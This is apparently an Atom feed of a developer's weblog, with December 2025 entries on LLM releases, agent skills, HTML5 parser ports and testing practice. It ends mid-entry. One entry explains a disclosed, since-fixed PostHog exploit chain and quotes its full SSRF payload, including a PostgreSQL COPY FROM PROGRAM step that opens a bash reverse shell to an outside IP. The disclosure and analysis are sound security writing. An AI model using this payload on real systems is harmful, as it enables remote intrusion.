<?xml version="1.0" encoding="utf-8"?>
<feed xml:lang="en-us" xmlns="http://www.w3.org/2005/Atom"><title>Simon Willison's Weblog</title><link href="http://simonwillison.net/" rel="alternate"/><link href="http://simonwillison.net/atom/everything/" rel="self"/><id>http://simonwillison.net/</id><updated>2025-12-19T18:33:41+00:00</updated><author><name>Simon Willison</name></author><entry><title>Sam Rose explains how LLMs work with a visual essay</title><link href="https://simonwillison.net/2025/Dec/19/sam-rose-llms/#atom-everything" rel="alternate"/><published>2025-12-19T18:33:41+00:00</published><updated>2025-12-19T18:33:41+00:00</updated><id>https://simonwillison.net/2025/Dec/19/sam-rose-llms/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://ngrok.com/blog/prompt-caching/"&gt;Sam Rose explains how LLMs work with a visual essay&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
Sam Rose is one of my favorite authors of &lt;a href="https://simonwillison.net/tags/explorables/"&gt;explorable interactive explanations&lt;/a&gt; - here's &lt;a href="https://samwho.dev/"&gt;his previous collection&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Sam joined ngrok in September as a developer educator. Here's his first big visual explainer for them, ostensibly about how prompt caching works but it quickly expands to cover tokenization, embeddings, and the basics of the transformer architecture.&lt;/p&gt;
&lt;p&gt;The result is one of the clearest and most accessible introductions to LLM internals I've seen anywhere.&lt;/p&gt;
&lt;div style="text-align: center"&gt;&lt;img alt="Animation. Starts in tokens mode with an array of 75, 305, 24, 887 - clicking embeddings animates those into a 2D array showing each one to be composed of three floating point numbers." src="https://static.simonwillison.net/static/2025/tokens-embeddings.gif" style="max-width: 100%"&gt;&lt;/div&gt;


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/explorables"&gt;explorables&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/sam-rose"&gt;sam-rose&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/tokenization"&gt;tokenization&lt;/a&gt;&lt;/p&gt;



</summary><category term="ai"/><category term="explorables"/><category term="generative-ai"/><category term="llms"/><category term="sam-rose"/><category term="tokenization"/></entry><entry><title>Introducing GPT-5.2-Codex</title><link href="https://simonwillison.net/2025/Dec/19/introducing-gpt-52-codex/#atom-everything" rel="alternate"/><published>2025-12-19T05:21:17+00:00</published><updated>2025-12-19T05:21:17+00:00</updated><id>https://simonwillison.net/2025/Dec/19/introducing-gpt-52-codex/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://openai.com/index/introducing-gpt-5-2-codex/"&gt;Introducing GPT-5.2-Codex&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
The latest in OpenAI's &lt;a href="https://simonwillison.net/tags/gpt-codex/"&gt;Codex family of models&lt;/a&gt; (not the same thing as their Codex CLI or Codex Cloud coding agent tools).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;GPT‑5.2-Codex is a version of &lt;a href="https://openai.com/index/introducing-gpt-5-2/"&gt;GPT‑5.2⁠&lt;/a&gt; further optimized for agentic coding in Codex, including improvements on long-horizon work through context compaction, stronger performance on large code changes like refactors and migrations, improved performance in Windows environments, and significantly stronger cybersecurity capabilities.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;As with some previous Codex models this one is available via their Codex coding agents now and will be coming to the API "in the coming weeks". Unlike previous models there's a new invite-only preview process for vetted cybersecurity professionals for "more permissive models".&lt;/p&gt;
&lt;p&gt;I've been very impressed recently with GPT 5.2's ability to &lt;a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/"&gt;tackle multi-hour agentic coding challenges&lt;/a&gt;. 5.2 Codex scores 64% on the Terminal-Bench 2.0 benchmark that GPT-5.2 scored 62.2% on. I'm not sure how concrete that 1.8% improvement will be!&lt;/p&gt;
&lt;p&gt;I didn't hack API access together this time (see &lt;a href="https://simonwillison.net/2025/Nov/9/gpt-5-codex-mini/"&gt;previous attempts&lt;/a&gt;), instead opting to just ask Codex CLI to "Generate an SVG of a pelican riding a bicycle" while running the new model (effort medium). &lt;a href="https://tools.simonwillison.net/codex-timeline?url=https://gist.githubusercontent.com/simonw/10ad81e82889a97a7d28827e0ea6d768/raw/d749473b37d86d519b4c3fa0892b5e54b5941b38/rollout-2025-12-18T16-09-10-019b33f0-6111-7840-89b0-aedf755a6e10.jsonl#tz=local&amp;amp;q=&amp;amp;type=all&amp;amp;payload=all&amp;amp;role=all&amp;amp;hide=1&amp;amp;truncate=1&amp;amp;sel=3"&gt;Here's the transcript&lt;/a&gt; in my new Codex CLI timeline viewer, and here's the pelican it drew:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Alt text by GPT-5.2-Codex: A minimalist illustration of a white pelican with a large orange beak riding a teal bicycle across a sandy strip of ground. The pelican leans forward as if pedaling, its wings tucked back and legs reaching toward the pedals. Simple gray motion lines trail behind it, and a pale yellow sun sits in the top‑right against a warm beige sky." src="https://static.simonwillison.net/static/2025/5.2-codex-pelican.png" /&gt;


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/openai"&gt;openai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/pelican-riding-a-bicycle"&gt;pelican-riding-a-bicycle&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm-release"&gt;llm-release&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/codex-cli"&gt;codex-cli&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/gpt-codex"&gt;gpt-codex&lt;/a&gt;&lt;/p&gt;



</summary><category term="ai"/><category term="openai"/><category term="generative-ai"/><category term="llms"/><category term="pelican-riding-a-bicycle"/><category term="llm-release"/><category term="codex-cli"/><category term="gpt-codex"/></entry><entry><title>Agent Skills</title><link href="https://simonwillison.net/2025/Dec/19/agent-skills/#atom-everything" rel="alternate"/><published>2025-12-19T01:09:18+00:00</published><updated>2025-12-19T01:09:18+00:00</updated><id>https://simonwillison.net/2025/Dec/19/agent-skills/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://agentskills.io/"&gt;Agent Skills&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
Anthropic have turned their &lt;a href="https://simonwillison.net/tags/skills/"&gt;skills mechanism&lt;/a&gt; into an "open standard", which I guess means it lives in an independent &lt;a href="https://github.com/agentskills/agentskills"&gt;agentskills/agentskills&lt;/a&gt; GitHub repository now? I wouldn't be surprised to see this end up &lt;a href="https://simonwillison.net/2025/Dec/9/agentic-ai-foundation/"&gt;in the AAIF&lt;/a&gt;, recently the new home of the MCP specification.&lt;/p&gt;
&lt;p&gt;The specification itself lives at &lt;a href="https://agentskills.io/specification"&gt;agentskills.io/specification&lt;/a&gt;, published from &lt;a href="https://github.com/agentskills/agentskills/blob/main/docs/specification.mdx"&gt;docs/specification.mdx&lt;/a&gt; in the repo.&lt;/p&gt;
&lt;p&gt;It is a deliciously tiny specification - you can read the entire thing in just a few minutes. It's also quite heavily under-specified - for example, there's a &lt;code&gt;metadata&lt;/code&gt; field described like this:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Clients can use this to store additional properties not defined by the Agent Skills spec&lt;/p&gt;
&lt;p&gt;We recommend making your key names reasonably unique to avoid accidental conflicts&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And an &lt;code&gt;allowed-skills&lt;/code&gt; field:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Experimental. Support for this field may vary between agent implementations&lt;/p&gt;
&lt;p&gt;Example:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;allowed-tools: Bash(git:*) Bash(jq:*) Read
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;The Agent Skills homepage promotes adoption by OpenCode, Cursor,Amp, Letta, goose, GitHub, and VS Code. Notably absent is OpenAI, who are &lt;a href="https://simonwillison.net/2025/Dec/12/openai-skills/"&gt;quietly tinkering with skills&lt;/a&gt; but don't appear to have formally announced their support just yet.


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/anthropic"&gt;anthropic&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-agents"&gt;ai-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/skills"&gt;skills&lt;/a&gt;&lt;/p&gt;



</summary><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="anthropic"/><category term="ai-agents"/><category term="coding-agents"/><category term="skills"/></entry><entry><title>swift-justhtml</title><link href="https://simonwillison.net/2025/Dec/18/swift-justhtml/#atom-everything" rel="alternate"/><published>2025-12-18T23:57:58+00:00</published><updated>2025-12-18T23:57:58+00:00</updated><id>https://simonwillison.net/2025/Dec/18/swift-justhtml/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://github.com/kylehowells/swift-justhtml"&gt;swift-justhtml&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
First there was Emil Stenström's &lt;a href="https://simonwillison.net/2025/Dec/14/justhtml/"&gt;JustHTML in Python&lt;/a&gt;, then my &lt;a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/"&gt;justjshtml in JavaScript&lt;/a&gt;, then Anil Madhavapeddy's &lt;a href="https://simonwillison.net/2025/Dec/17/vibespiling/"&gt;html5rw in OCaml&lt;/a&gt;, and now Kyle Howells has built a vibespiled dependency-free HTML5 parser for Swift using the same coding agent tricks against the &lt;a href="https://github.com/html5lib/html5lib-tests"&gt;html5lib-tests&lt;/a&gt; test suite.&lt;/p&gt;
&lt;p&gt;Kyle ran &lt;a href="https://github.com/kylehowells/swift-justhtml/blob/master/Benchmarks/BENCHMARK_RESULTS.md#performance-comparison"&gt;some benchmarks&lt;/a&gt; to compare the different implementations:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Rust (html5ever)&lt;/strong&gt; total parse time: 303 ms&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Swift&lt;/strong&gt; total parse time: 1313 ms&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JavaScript&lt;/strong&gt; total parse time: 1035 ms&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Python&lt;/strong&gt; total parse time: 4189 ms&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/html5"&gt;html5&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/vibe-coding"&gt;vibe-coding&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/swift"&gt;swift&lt;/a&gt;&lt;/p&gt;



</summary><category term="html5"/><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="ai-assisted-programming"/><category term="vibe-coding"/><category term="swift"/></entry><entry><title>Your job is to deliver code you have proven to work</title><link href="https://simonwillison.net/2025/Dec/18/code-proven-to-work/#atom-everything" rel="alternate"/><published>2025-12-18T14:49:38+00:00</published><updated>2025-12-18T14:49:38+00:00</updated><id>https://simonwillison.net/2025/Dec/18/code-proven-to-work/#atom-everything</id><summary type="html">
    &lt;p&gt;In all of the debates about the value of AI-assistance in software development there's one depressing anecdote that I keep on seeing: the junior engineer, empowered by some class of LLM tool, who deposits giant, untested PRs on their coworkers - or open source maintainers - and expects the "code review" process to handle the rest.&lt;/p&gt;
&lt;p&gt;This is rude, a waste of other people's time, and is honestly a dereliction of duty as a software developer.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Your job is to deliver code you have proven to work.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As software engineers we don't just crank out code - in fact these days you could argue that's what the LLMs are for. We need to deliver &lt;em&gt;code that works&lt;/em&gt; - and we need to include &lt;em&gt;proof&lt;/em&gt; that it works as well.  Not doing that directly shifts the burden of the actual work to whoever is expected to review our code.&lt;/p&gt;
&lt;h4 id="how-to-prove-it-works"&gt;How to prove it works&lt;/h4&gt;
&lt;p&gt;There are two steps to proving a piece of code works. Neither is optional.&lt;/p&gt;
&lt;p&gt;The first is &lt;strong&gt;manual testing&lt;/strong&gt;. If you haven't seen the code do the right thing yourself, that code doesn't work. If it does turn out to work, that's honestly just pure chance.&lt;/p&gt;
&lt;p&gt;Manual testing skills are genuine skills that you need to develop. You need to be able to get the system into an initial state that demonstrates your change, then exercise the change, then check and demonstrate that it has the desired effect.&lt;/p&gt;
&lt;p&gt;If possible I like to reduce these steps to a sequence of terminal commands which I can paste, along with their output, into a comment in the code review. Here's a &lt;a href="https://github.com/simonw/llm-gemini/issues/116#issuecomment-3666551798"&gt;recent example&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Some changes are harder to demonstrate. It's still your job to demonstrate them! Record a screen capture video and add that to the PR. Show your reviewers that the change you made actually works.&lt;/p&gt;
&lt;p&gt;Once you've tested the happy path where everything works you can start trying the edge cases. Manual testing is a skill, and finding the things that break is the next level of that skill that helps define a senior engineer.&lt;/p&gt;
&lt;p&gt;The second step in proving a change works is &lt;strong&gt;automated testing&lt;/strong&gt;. This is so much easier now that we have LLM tooling, which means there's no excuse at all for skipping this step.&lt;/p&gt;
&lt;p&gt;Your contribution should &lt;a href="https://simonwillison.net/2022/Oct/29/the-perfect-commit/"&gt;bundle the change&lt;/a&gt; with an automated test that proves the change works. That test should fail if you revert the implementation.&lt;/p&gt;
&lt;p&gt;The process for writing a test mirrors that of manual testing: get the system into an initial known state, exercise the change, assert that it worked correctly. Integrating a test harness to productively facilitate this is another key skill worth investing in.&lt;/p&gt;
&lt;p&gt;Don't be tempted to skip the manual test because you think the automated test has you covered already! Almost every time I've done this myself I've quickly regretted it.&lt;/p&gt;
&lt;h4 id="make-your-coding-agent-prove-it-first"&gt;Make your coding agent prove it first&lt;/h4&gt;
&lt;p&gt;The most important trend in LLMs in 2025 has been the explosive growth of &lt;strong&gt;coding agents&lt;/strong&gt; - tools like Claude Code and Codex CLI that can actively execute the code they are working on to check that it works and further iterate on any problems.&lt;/p&gt;
&lt;p&gt;To master these tools you need to learn how to get them to &lt;em&gt;prove their changes work&lt;/em&gt; as well.&lt;/p&gt;
&lt;p&gt;This looks exactly the same as the process I described above: they need to be able to manually test their changes as they work, and they need to be able to build automated tests that guarantee the change will continue to work in the future.&lt;/p&gt;
&lt;p&gt;Since they're robots, automated tests and manual tests are effectively the same thing.&lt;/p&gt;
&lt;p&gt;They do feel a little different though. When I'm working on CLI tools I'll usually teach Claude Code how to run them itself so it can do one-off tests, even though the eventual automated tests will use a system like &lt;a href="https://click.palletsprojects.com/en/stable/testing/"&gt;Click's CLIRunner&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;When working on CSS changes I'll often encourage my coding agent to take screenshots when it needs to check if the change it made had the desired effect.&lt;/p&gt;
&lt;p&gt;The good news about automated tests is that coding agents need very little encouragement to write them. If your project has tests already most agents will extend that test suite without you even telling them to do so. They'll also reuse patterns from existing tests, so keeping your test code well organized and populated with patterns you like is a great way to help your agent build testing code to your taste.&lt;/p&gt;
&lt;p&gt;Developing good taste in testing code is another of those skills that differentiates a senior engineer.&lt;/p&gt;
&lt;h4 id="the-human-provides-the-accountability"&gt;The human provides the accountability&lt;/h4&gt;
&lt;p&gt;&lt;a href="https://simonwillison.net/2025/Feb/3/a-computer-can-never-be-held-accountable/"&gt;A computer can never be held accountable&lt;/a&gt;. That's your job as the human in the loop.&lt;/p&gt;
&lt;p&gt;Almost anyone can prompt an LLM to generate a thousand-line patch and submit it for code review. That's no longer valuable. What's valuable is contributing &lt;em&gt;code that is proven to work&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Next time you submit a PR, make sure you've included your evidence that it works as it should.&lt;/p&gt;
    
        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/programming"&gt;programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/careers"&gt;careers&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-ethics"&gt;ai-ethics&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/vibe-coding"&gt;vibe-coding&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;&lt;/p&gt;
    

</summary><category term="programming"/><category term="careers"/><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="ai-assisted-programming"/><category term="ai-ethics"/><category term="vibe-coding"/><category term="coding-agents"/></entry><entry><title>Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain</title><link href="https://simonwillison.net/2025/Dec/18/ssrf-clickhouse-postgresql/#atom-everything" rel="alternate"/><published>2025-12-18T01:42:22+00:00</published><updated>2025-12-18T01:42:22+00:00</updated><id>https://simonwillison.net/2025/Dec/18/ssrf-clickhouse-postgresql/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://mdisec.com/inside-posthog-how-ssrf-a-clickhouse-sql-escaping-0day-and-default-postgresql-credentials-formed-an-rce-chain-zdi-25-099-zdi-25-097-zdi-25-096/"&gt;Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
Mehmet Ince describes a very elegant chain of attacks against the PostHog analytics platform, combining several different vulnerabilities (now all reported and fixed) to achieve RCE - Remote Code Execution - against an internal PostgreSQL server.&lt;/p&gt;
&lt;p&gt;The way in abuses a webhooks system with non-robust URL validation, setting up a SSRF (Server-Side Request Forgery) attack where the server makes a request against an internal network resource.&lt;/p&gt;
&lt;p&gt;Here's the URL that gets injected:&lt;/p&gt;
&lt;p&gt;&lt;code style="word-break: break-all"&gt;http://clickhouse:8123/?query=SELECT+&lt;em&gt;+FROM+postgresql('db:5432','posthog',\"posthog_use'))+TO+STDOUT;END;DROP+TABLE+IF+EXISTS+cmd_exec;CREATE+TABLE+cmd_exec(cmd_output+text);COPY+cmd_exec+FROM+PROGRAM+$$bash+-c+\\"bash+-i+&amp;gt;%26+/dev/tcp/172.31.221.180/4444+0&amp;gt;%261\\"$$;SELECT+&lt;/em&gt;+FROM+cmd_exec;+--\",'posthog','posthog')#&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Reformatted a little for readability:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://clickhouse:8123/?query=
SELECT *
FROM postgresql(
    'db:5432',
    'posthog',
    "posthog_use')) TO STDOUT;
    END;
    DROP TABLE IF EXISTS cmd_exec;
    CREATE TABLE cmd_exec (
        cmd_output text
    );
    COPY cmd_exec
    FROM PROGRAM $$
        bash -c \"bash -i &amp;gt;&amp;amp; /dev/tcp/172.31.221.180/4444 0&amp;gt;&amp;amp;1\"
    $$;
    SELECT * FROM cmd_exec;
    --",
    'posthog',
    'posthog'
)
#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This abuses ClickHouse's ability to &lt;a href="https://clickhouse.com/docs/sql-reference/table-functions/postgresql#implementation-details"&gt;run its own queries against PostgreSQL&lt;/a&gt; using the &lt;code&gt;postgresql()&lt;/code&gt; table function, combined with an escaping bug in ClickHouse PostgreSQL function (&lt;a href="https://github.com/ClickHouse/ClickHouse/pull/74144"&gt;since fixed&lt;/a&gt;). Then &lt;em&gt;that&lt;/em&gt; query abuses PostgreSQL's ability to run shell commands via &lt;code&gt;COPY ... FROM PROGRAM&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;bash -c&lt;/code&gt; bit is particularly nasty - it opens a reverse shell such that an attacker with a machine at that IP address listening on port 4444 will receive a connection from the PostgreSQL server that can then be used to execute arbitrary commands.

    &lt;p&gt;&lt;small&gt;&lt;/small&gt;Via &lt;a href="https://news.ycombinator.com/item?id=46305321"&gt;Hacker News&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/postgresql"&gt;postgresql&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/security"&gt;security&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/webhooks"&gt;webhooks&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/clickhouse"&gt;clickhouse&lt;/a&gt;&lt;/p&gt;



</summary><category term="postgresql"/><category term="security"/><category term="webhooks"/><category term="clickhouse"/></entry><entry><title>AoAH Day 15: Porting a complete HTML5 parser and browser test suite</title><link href="https://simonwillison.net/2025/Dec/17/vibespiling/#atom-everything" rel="alternate"/><published>2025-12-17T23:23:35+00:00</published><updated>2025-12-17T23:23:35+00:00</updated><id>https://simonwillison.net/2025/Dec/17/vibespiling/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://anil.recoil.org/notes/aoah-2025-15"&gt;AoAH Day 15: Porting a complete HTML5 parser and browser test suite&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
Anil Madhavapeddy is running an &lt;a href="https://anil.recoil.org/notes/aoah-2025"&gt;Advent of Agentic Humps&lt;/a&gt; this year, building a new useful OCaml library every day for most of December.&lt;/p&gt;
&lt;p&gt;Inspired by Emil Stenström's &lt;a href="https://simonwillison.net/2025/Dec/14/justhtml/"&gt;JustHTML&lt;/a&gt; and my own coding agent &lt;a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/"&gt;port of that to JavaScript&lt;/a&gt; he coined the term &lt;strong&gt;vibespiling&lt;/strong&gt; for AI-powered porting and transpiling of code from one language to another and had a go at building an HTML5 parser in OCaml, resulting in &lt;a href="https://tangled.org/anil.recoil.org/ocaml-html5rw"&gt;html5rw&lt;/a&gt; which passes the same &lt;a href="https://github.com/html5lib/html5lib-tests"&gt;html5lib-tests&lt;/a&gt; suite that Emil and myself used for our projects.&lt;/p&gt;
&lt;p&gt;Anil's thoughts on the copyright and ethical aspects of this are worth quoting in full:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The question of copyright and licensing is difficult. I definitely did &lt;em&gt;some&lt;/em&gt; editing by hand, and a fair bit of prompting that resulted in targeted code edits, but the vast amount of architectural logic came from JustHTML. So I opted to make the &lt;a href="https://tangled.org/anil.recoil.org/ocaml-html5rw/blob/main/LICENSE.md"&gt;LICENSE a joint one&lt;/a&gt; with &lt;a href="https://friendlybit.com"&gt;Emil Stenström&lt;/a&gt;. I did not follow the transitive dependency through to the Rust one, which I probably should.&lt;/p&gt;
&lt;p&gt;I'm also extremely uncertain about every releasing this library to the central opam repository, especially as there are &lt;a href="https://github.com/aantron/lambdasoup"&gt;excellent HTML5 parsers&lt;/a&gt; already available. I haven't checked if those pass the HTML5 test suite, because this is wandering into the agents &lt;em&gt;vs&lt;/em&gt; humans territory that I ruled out in my &lt;a href="https://anil.recoil.org/notes/aoah-2025#groundrules-for-the-advent-of-agentic-humps"&gt;groundrules&lt;/a&gt;. Whether or not this agentic code is better or not is a moot point if releasing it drives away the human maintainers who are the source of creativity in the code!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I decided to &lt;a href="https://github.com/simonw/justjshtml/commit/106289acee29045cc5afe9732915357063dfc37a"&gt;credit Emil in the same way&lt;/a&gt; for my own vibespiled project.

    &lt;p&gt;&lt;small&gt;&lt;/small&gt;Via &lt;a href="https://twitter.com/avsm/status/2000979482744607216"&gt;@avsm&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/definitions"&gt;definitions&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/functional-programming"&gt;functional-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-ethics"&gt;ai-ethics&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/vibe-coding"&gt;vibe-coding&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ocaml"&gt;ocaml&lt;/a&gt;&lt;/p&gt;



</summary><category term="definitions"/><category term="functional-programming"/><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="ai-assisted-programming"/><category term="ai-ethics"/><category term="vibe-coding"/><category term="ocaml"/></entry><entry><title>Gemini 3 Flash</title><link href="https://simonwillison.net/2025/Dec/17/gemini-3-flash/#atom-everything" rel="alternate"/><published>2025-12-17T22:44:52+00:00</published><updated>2025-12-17T22:44:52+00:00</updated><id>https://simonwillison.net/2025/Dec/17/gemini-3-flash/#atom-everything</id><summary type="html">
    &lt;p&gt;It continues to be a busy December, if not quite as busy &lt;a href="https://simonwillison.net/2024/Dec/20/december-in-llms-has-been-a-lot/"&gt;as last year&lt;/a&gt;. Today's big news is &lt;a href="https://blog.google/technology/developers/build-with-gemini-3-flash/"&gt;Gemini 3 Flash&lt;/a&gt;, the latest in Google's "Flash" line of faster and less expensive models.&lt;/p&gt;
&lt;p&gt;Google are emphasizing the comparison between the new Flash and their previous generation's top model Gemini 2.5 Pro:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Building on 3 Pro’s strong multimodal, coding and agentic features, 3 Flash offers powerful performance at less than a quarter the cost of 3 Pro, along with higher rate limits. The new 3 Flash model surpasses 2.5 Pro across many benchmarks while delivering faster speeds.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Gemini 3 Flash's characteristics are almost identical to Gemini 3 Pro: it accepts text, image, video, audio, and PDF, outputs only text, handles 1,048,576 maximum input tokens and up to 65,536 output tokens, and has the same knowledge cut-off date of January 2025 (also shared with the Gemini 2.5 series).&lt;/p&gt;
&lt;p&gt;The benchmarks look good. The cost is appealing: 1/4 the price of Gemini 3 Pro ≤200k and 1/8 the price of Gemini 3 Pro &amp;gt;200k, and it's nice not to have a price increase for the new Flash at larger token lengths.&lt;/p&gt;
&lt;p&gt;It's a little &lt;em&gt;more&lt;/em&gt; expensive than previous Flash models - Gemini 2.5 Flash was $0.30/million input tokens and $2.50/million on output, Gemini 3 Flash is $0.50/million and $3/million respectively.&lt;/p&gt;
&lt;p&gt;Google &lt;a href="https://blog.google/products/gemini/gemini-3-flash/"&gt;claim&lt;/a&gt; it may still end up cheaper though, due to more efficient output token usage:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;&gt; Gemini 3 Flash is able to modulate how much it thinks. It may think longer for more complex use cases, but it also uses 30% fewer tokens on average than 2.5 Pro.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Here's &lt;a href="https://www.llm-prices.com/#it=100000&amp;amp;ot=10000&amp;amp;sel=gemini-3-flash-preview%2Cgemini-3-pro-preview%2Cgemini-3-pro-preview-200k%2Cgpt-5.2%2Cclaude-opus-4-5%2Cclaude-sonnet-4.5%2Cclaude-4.5-haiku%2Cgemini-2.5-flash%2Cgpt-5-mini"&gt;a more extensive price comparison&lt;/a&gt; on my &lt;a href="https://www.llm-prices.com/"&gt;llm-prices.com&lt;/a&gt; site.&lt;/p&gt;
&lt;h4 id="generating-some-svgs-of-pelicans"&gt;Generating some SVGs of pelicans&lt;/h4&gt;
&lt;p&gt;I released &lt;a href="https://github.com/simonw/llm-gemini/releases/tag/0.28"&gt;llm-gemini 0.28&lt;/a&gt; this morning with support for the new model. You can try it out like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;llm install -U llm-gemini
llm keys set gemini # paste in key
llm -m gemini-3-flash-preview "Generate an SVG of a pelican riding a bicycle"
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;According to &lt;a href="https://ai.google.dev/gemini-api/docs/gemini-3#thinking_level"&gt;the developer docs&lt;/a&gt; the new model supports four different thinking level options: &lt;code&gt;minimal&lt;/code&gt;, &lt;code&gt;low&lt;/code&gt;, &lt;code&gt;medium&lt;/code&gt;, and &lt;code&gt;high&lt;/code&gt;. This is different from Gemini 3 Pro, which only supported &lt;code&gt;low&lt;/code&gt; and &lt;code&gt;high&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;You can run those like this:&lt;/p&gt;
